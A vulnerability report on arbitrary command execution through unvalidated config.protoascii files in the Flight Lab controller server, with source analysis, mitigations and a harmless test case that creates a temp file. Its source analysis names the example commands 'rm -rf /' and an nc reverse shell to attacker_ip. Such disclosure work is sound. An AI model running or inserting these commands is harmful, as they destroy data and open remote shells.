### Vulnerability List

- Vulnerability Name: Unvalidated Configuration File Leading to Arbitrary Command Execution
- Description:
    1. An attacker crafts a malicious `config.protoascii` file.
    2. This malicious configuration file is placed on the server machine.
    3. The Flight Lab controller server reads and parses this malicious configuration file during startup or reconfiguration.
    4. The malicious configuration file defines a `CommandLineComponent` with malicious commands in the `when_on` or `when_off` fields.
    5. When the controller server starts or when a system command triggers the malicious component (e.g., system start/stop), the arbitrary commands are executed on the server machine.
- Impact: Arbitrary command execution on the server machine. This can lead to complete system compromise, data exfiltration, installation of malware, or denial of service.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations: None. The code parses the configuration file using protobuf's `text_format.Merge`, which does not inherently validate the contents for security implications like command injection.
- Missing Mitigations:
    - Input validation and sanitization for the `config.protoascii` file, specifically for fields that are used to execute commands, such as the `when_on` and `when_off` lists in `CommandLineComponent`. A whitelist of allowed commands or parameters, or a secure way to define allowed operations, should be implemented.
    - Principle of least privilege: Ensure the controller server and client applications run with the minimum necessary privileges to reduce the impact of successful exploits.
    - Integrity checks for the configuration file to detect unauthorized modifications.
- Preconditions:
    - The attacker must be able to place a malicious `config.protoascii` file on the server machine. This could be achieved through various means, such as exploiting other vulnerabilities in the system (if any), social engineering, or physical access to the server.
- Source Code Analysis:
    1. **Configuration Loading (`/code/controller/main.py`)**: The `ControllerApp` class in `main.py` loads the system configuration from the `config.protoascii` file using `text_format.Merge`.
    ```python
    FLAGS = gflags.FLAGS
    gflags.DEFINE_string('config', 'config.protoascii',
                         'Path to system configuration file.')
    class ControllerApp(pattern.Logger, appcommands.Cmd):
        def __init__(self, *args, **kwargs):
            super(ControllerApp, self).__init__(*args, **kwargs)
            # ...
            self._system_config = controller_pb2.System()
            with open(FLAGS.config, 'r') as f:
              config_text = f.read()
              text_format.Merge(config_text, self._system_config)
    ```
    This code reads the configuration file specified by the `--config` flag and parses it into a `controller_pb2.System` protobuf object.

    2. **CommandLineComponent Execution (`/code/controller/components/app.py`)**: The `CommandLineComponent` in `app.py` directly executes commands defined in the configuration using `subprocess.call`.
    ```python
    class CommandLineComponent(base.Component):
      def _start(self):
        for cmd in self.settings.when_on:
          self.logger.info('[{0}] Running: {1}'.format(self.name, cmd))
          ret = subprocess.call(cmd)
          self.logger.info('[{0}] Done (return code={1})'.format(self.name, ret))

      def _stop(self):
        for cmd in self.settings.when_off:
          self.logger.info('[{0}] Running: {1}'.format(self.name, cmd))
          ret = subprocess.call(cmd)
          self.logger.info('[{0}] Done (return code={1})'.format(self.name, ret))
    ```
    The `_start` and `_stop` methods iterate through the `when_on` and `when_off` lists from the component's settings and execute each command using `subprocess.call`. There is no input validation or sanitization on these commands.

    **Visualization**:

    ```
    config.protoascii --> ControllerApp (parses config) --> ComponentFactory (creates components) --> CommandLineComponent

    CommandLineComponent.start() or .stop() --> for cmd in settings.when_on/off: --> subprocess.call(cmd) --> System Command Execution
    ```

    If a malicious user can modify `config.protoascii` to include commands like `rm -rf /` or `nc -e /bin/bash attacker_ip port` within a `CommandLineComponent`, and the server is started with this modified configuration, these commands will be executed when the component is initialized or triggered (e.g., on system start or stop).

- Security Test Case:
    1. **Prepare Malicious Configuration File**: Create a file named `malicious_config.protoascii` with the following content. This configuration defines a `CommandLineComponent` that will create a file `/tmp/flightlab_pwned.txt` when the component is started.
    ```
    machines: [
      {
        name: "master"
        ip: "127.0.0.1"
        components: [
          {
            name: "malicious_command"
            type: COMMANDLINE
            commandline: {
              when_on: ["touch /tmp/flightlab_pwned.txt"]
            }
          }
        ]
      }
    ]
    master_machine_name: "master"
    ```
    2. **Replace Configuration File**: Assume you have a way to replace the legitimate `config.protoascii` with `malicious_config.protoascii` on the server machine. For testing purposes, you might manually replace the file. In a real attack scenario, this might involve exploiting another vulnerability or social engineering.
    3. **Start Controller Server**: Run the controller server application, pointing it to the malicious configuration file:
    ```sh
    python main.py server --config malicious_config.protoascii
    ```
    4. **Trigger Component Start**: Send a system start command to the server, for example, by using `curl` to access the `/system/on` API endpoint (if the HTTP API is enabled and accessible) or by any other mechanism that triggers the `START` system command.
    ```sh
    curl http://<server_ip>:8080/system/on
    ```
    5. **Verify Command Execution**: Check if the file `/tmp/flightlab_pwned.txt` has been created on the server machine.
    ```sh
    ls /tmp/flightlab_pwned.txt
    ```
    If the file exists, it confirms that the arbitrary command defined in the malicious configuration file was executed by the `CommandLineComponent`, demonstrating the vulnerability.